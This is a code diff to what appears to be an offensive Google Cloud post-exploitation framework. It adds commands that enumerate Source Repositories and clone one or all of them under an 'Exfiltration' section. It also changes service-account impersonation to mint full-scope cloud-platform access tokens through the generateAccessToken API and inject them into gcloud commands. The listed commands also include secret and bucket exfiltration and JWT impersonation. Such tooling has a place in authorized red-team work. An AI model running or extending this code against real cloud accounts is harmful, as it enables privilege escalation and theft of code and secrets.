@@ -51,6 +51,7 @@ from .modules.enumeration import (
     enumerate_delegation_chains,
     enumerate_resource_permissions,
     enumerate_secrets,
+    enumerate_source_repositories,
     enumerate_artifact_repositories,
     enumerate_artifact_packages,
     enumerate_artifact_versions,
@@ -64,6 +65,8 @@ from .modules.enumeration import (
 )
 
 from .modules.exfiltration import (
+    clone_all_source_repositories,
+    clone_source_repository,
     download_object,
     download_all_objects,
     exfil_parameters,
@@ -169,7 +172,7 @@ def build_completer(session_mgr: GCPSessionManager, force_rebuild: bool = False)
         "enumerate_build_triggers", "enumerate_build_history", "describe_cloud_build",
         "enumerate_objects", "enumerate_parameters",
         "enumerate_exploitable_sas", "enumerate_delegation_chains",
-        "enumerate_resource_permissions", "enumerate_secrets",
+        "enumerate_resource_permissions", "enumerate_secrets", "enumerate_source_repos",
         "enumerate_artifacts", "enumerate_artifact_packages", "enumerate_artifact_versions",
         "enumerate_drive", "search_drive", "list_shared_drive", "describe_drive_file",
         "download_drive_file", "download_drive_files",
@@ -182,6 +185,7 @@ def build_completer(session_mgr: GCPSessionManager, force_rebuild: bool = False)
         "get_sa_iam_policy", "set_sa_iam_policy", "remove_sa_iam_binding",
         "impersonate_jwt", "generate_jwt", "exchange_jwt", "show_jwt_templates",
         # Exfiltration
+        "clone_source_repo", "clone_all_source_repos",
         "download_object", "exfil_bucket", "exfil_parameters", "exfil_parameter",
         "exfil_secrets", "exfil_secret", "download_artifact",
         # Passthrough
@@ -289,13 +293,93 @@ def run_gcloud_from_shell(raw_cmd: str, session_mgr: GCPSessionManager) -> None:
                 raw_cmd = f"{parts[0]} --project={project} {parts[1]}"
 
     if impersonated_sa:
-        # Inject --impersonate-service-account if not already specified
+        # When impersonating, generate an access token with full cloud-platform scope
+        # instead of using --impersonate-service-account (which has limited default scopes)
+        # This fixes access to APIs like Source Repositories that require specific scopes
         if "--impersonate-service-account" not in raw_cmd:
-            parts = raw_cmd.split(maxsplit=1)
-            if len(parts) > 1:
-                raw_cmd = f"{parts[0]} --impersonate-service-account={impersonated_sa} {parts[1]}"
+            # If auth_method is access_token, the token is already impersonated
+            # (created by the 'impersonate' command), so we don't need to do anything
+            if auth_method == "access_token":
+                # Token is already impersonated, just use it as-is
+                pass
             else:
-                raw_cmd = f"{parts[0]} --impersonate-service-account={impersonated_sa}"
+                # Need to generate impersonated token from service account or ADC credentials
+                try:
+                    # Get current token to call generateAccessToken API
+                    current_token = None
+                    if auth_method == "service_account" and sa_file:
+                        credentials = session_mgr.get_credentials()
+                        if credentials:
+                            from google.auth.transport.requests import Request
+                            credentials.refresh(Request())
+                            current_token = credentials.token
+                    elif auth_method == "adc":
+                        credentials = session_mgr.get_credentials()
+                        if credentials:
+                            from google.auth.transport.requests import Request
+                            if not credentials.valid:
+                                credentials.refresh(Request())
+                            current_token = credentials.token
+
+                    if current_token:
+                        # Call generateAccessToken API with cloud-platform scope
+                        import requests as req
+                        api_url = f"https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/{impersonated_sa}:generateAccessToken"
+                        headers = {
+                            "Authorization": f"Bearer {current_token}",
+                            "Content-Type": "application/json",
+                        }
+                        body = {
+                            "scope": ["https://www.googleapis.com/auth/cloud-platform"],
+                            "lifetime": "3600s",
+                        }
+
+                        response = req.post(api_url, json=body, headers=headers, timeout=30)
+                        if response.status_code == 200:
+                            result = response.json()
+                            impersonated_token = result.get("accessToken")
+
+                            if impersonated_token:
+                                # Override token_to_use with impersonated token
+                                token_to_use = impersonated_token
+
+                                # Write impersonated token to temp file (overwrite if exists, or create new)
+                                if temp_token_file:
+                                    # Overwrite existing token file
+                                    with open(temp_token_file.name, 'w') as f:
+                                        f.write(token_to_use)
+                                else:
+                                    # Create new temp file for impersonated token
+                                    fd, temp_token_path = tempfile.mkstemp(suffix='.txt')
+                                    temp_token_file_fd = os.fdopen(fd, 'w')
+                                    temp_token_file_fd.write(token_to_use)
+                                    temp_token_file_fd.close()
+                                    os.chmod(temp_token_path, 0o600)
+                                    temp_token_file = type('TempFile', (), {'name': temp_token_path})()
+
+                                    # Add --access-token-file to command
+                                    if "--access-token-file" not in raw_cmd:
+                                        parts = raw_cmd.split(maxsplit=1)
+                                        if len(parts) > 1:
+                                            raw_cmd = f"{parts[0]} --access-token-file={temp_token_file.name} {parts[1]}"
+                                        else:
+                                            raw_cmd = f"{parts[0]} --access-token-file={temp_token_file.name}"
+                        else:
+                            # Fallback to --impersonate-service-account if API fails
+                            console.print("[dim yellow]Failed to generate impersonated token, using --impersonate-service-account fallback[/dim yellow]")
+                            parts = raw_cmd.split(maxsplit=1)
+                            if len(parts) > 1:
+                                raw_cmd = f"{parts[0]} --impersonate-service-account={impersonated_sa} {parts[1]}"
+                            else:
+                                raw_cmd = f"{parts[0]} --impersonate-service-account={impersonated_sa}"
+                except Exception as e:
+                    # Fallback to --impersonate-service-account if anything fails
+                    console.print(f"[dim yellow]Error generating impersonated token: {e}[/dim yellow]")
+                    parts = raw_cmd.split(maxsplit=1)
+                    if len(parts) > 1:
+                        raw_cmd = f"{parts[0]} --impersonate-service-account={impersonated_sa} {parts[1]}"
+                    else:
+                        raw_cmd = f"{parts[0]} --impersonate-service-account={impersonated_sa}"
 
     try:
         proc = subprocess.Popen(
@@ -976,6 +1060,12 @@ def run_gcp_cli(session_mgr: GCPSessionManager) -> str:
                 enumerate_secrets(session_mgr, project_id)
                 _log_command(session_mgr, cmd)
 
+            elif cmd == "enumerate_source_repos":
+                # Enumerate Google Source Repositories
+                # Usage: enumerate_source_repos
+                enumerate_source_repositories(session_mgr)
+                _log_command(session_mgr, cmd)
+
             elif cmd == "enumerate_artifacts":
                 # Enumerate Artifact Registry repositories
                 # Usage: enumerate_artifacts [project_id]
@@ -1363,6 +1453,25 @@ def run_gcp_cli(session_mgr: GCPSessionManager) -> str:
                 _log_command(session_mgr, cmd)
 
             # ---------- Exfiltration ----------
+
+            elif cmd == "clone_source_repo":
+                # Clone a single Source Repository
+                # Usage: clone_source_repo [repo_name] [project_id] [output_dir]
+                repo_name = args[0] if args else None
+                project_id = args[1] if len(args) > 1 else None
+                output_dir = args[2] if len(args) > 2 else None
+
+                clone_source_repository(session_mgr, repo_name, project_id, output_dir)
+                _log_command(session_mgr, f"{cmd} {repo_name or 'interactive'}")
+
+            elif cmd == "clone_all_source_repos":
+                # Clone all Source Repositories from a project
+                # Usage: clone_all_source_repos [project_id] [output_base_dir]
+                project_id = args[0] if args else None
+                output_base_dir = args[1] if len(args) > 1 else None
+
+                clone_all_source_repositories(session_mgr, project_id, output_base_dir)
+                _log_command(session_mgr, f"{cmd} {project_id or 'all_projects'}")
 
             elif cmd == "download_object":
                 # Download a single object from a bucket
